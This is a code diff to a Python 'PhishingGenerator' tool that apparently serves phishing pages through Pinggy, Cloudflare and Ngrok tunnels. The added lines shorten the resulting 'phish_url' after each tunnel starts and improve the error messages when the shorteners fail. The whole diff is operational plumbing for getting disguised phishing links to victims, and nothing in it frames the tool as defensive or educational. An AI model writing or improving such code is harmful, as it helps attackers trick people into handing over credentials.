@@ -1060,6 +1060,7 @@ class PhishingGenerator:
             if url:
                 self.server_url = url
                 console.print(f"[green]✅ Pinggy tunnel: {url}[/]")
+                self._shorten_url_for_display(url)
                 console.print(f"[dim]🌐 {url} {'— accessible from any browser' if self.language == 'en' else '— bisa diakses dari browser mana pun'}[/]")
             else:
                 raise Exception("Could not parse Pinggy URL. Output: " + ' | '.join(output_log[-5:]))
@@ -1172,6 +1173,7 @@ class PhishingGenerator:
             if url:
                 self.server_url = url
                 console.print(f"[green]✅ Cloudflare tunnel: {url}[/]")
+                self._shorten_url_for_display(url)
             elif use_quick:
                 console.print("[yellow]⚠ Quick tunnel URL not found. Check logs.[/]")
                 self.server_url = None
@@ -1181,6 +1183,7 @@ class PhishingGenerator:
                 if saved_url:
                     self.server_url = saved_url
                     console.print(f"[green]✅ Cloudflare tunnel started → {saved_url}[/]")
+                    self._shorten_url_for_display(saved_url)
                 else:
                     console.print("[yellow]Enter your tunnel's public hostname/URL (from Cloudflare dashboard):[/]")
                     public_url = console.input(f"[cyan]URL (e.g. https://phish.yourdomain.com): [/]").strip().rstrip('/')
@@ -1188,6 +1191,7 @@ class PhishingGenerator:
                         self.server_url = public_url
                         self._save_session_key('cf_url', public_url)
                         console.print(f"[green]✅ Cloudflare tunnel → {public_url}[/]")
+                        self._shorten_url_for_display(public_url)
                     else:
                         self.server_url = f"http://localhost:{addr}"
         except Exception as e:
@@ -1290,6 +1294,7 @@ class PhishingGenerator:
             msg = f"✅ Ngrok tunnel berhasil dibuat di {self.server_url}"
             self.logger.info(msg)
             console.print(f"[green]{msg}[/]")
+            self._shorten_url_for_display(self.server_url)
 
         except Exception as e:
             msg = f"❌ Tunnel failed: {str(e)}"
@@ -1520,11 +1525,12 @@ class PhishingGenerator:
                     shortened_url = fn(phish_url)
                     if shortened_url:
                         break
-                except:
+                except Exception as e:
+                    console.print(f"[dim]  {name} failed: {str(e)[:60]}[/]")
                     continue
 
             if not shortened_url:
-                console.print("[red]❌ All URL shorteners failed. Using raw link.[/]")
+                console.print("[yellow]⚠ All URL shorteners failed. Raw link below:[/]")
                 shortened_url = phish_url
             
             sep = "─" * 40
